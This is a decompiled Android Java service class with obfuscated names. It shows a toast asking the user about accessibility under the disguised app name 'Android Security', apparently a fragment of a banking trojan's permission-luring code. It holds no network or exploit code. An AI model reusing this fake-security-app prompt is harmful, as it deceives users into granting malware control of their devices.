package wocwvy.czyxoxmbauu.slsa;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;

/* JADX INFO: loaded from: classes.dex */
public class clgqtzqdh extends Service {

    /* JADX INFO: renamed from: a */
    C0020b f396a = new C0020b();

    /* JADX INFO: renamed from: b */
    C0022c f397b = new C0022c();

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        String strM256i = this.f396a.m256i(this);
        this.f397b.getClass();
        if (!"Android Security".equals("")) {
            this.f397b.getClass();
            strM256i = "Android Security";
        }
        Toast toastMakeText = Toast.makeText(this, this.f396a.m251e(this, "StringAccessibility") + " '" + strM256i + "'", 1);
        toastMakeText.setGravity(16, 0, 0);
        toastMakeText.show();
        return i;
    }
}
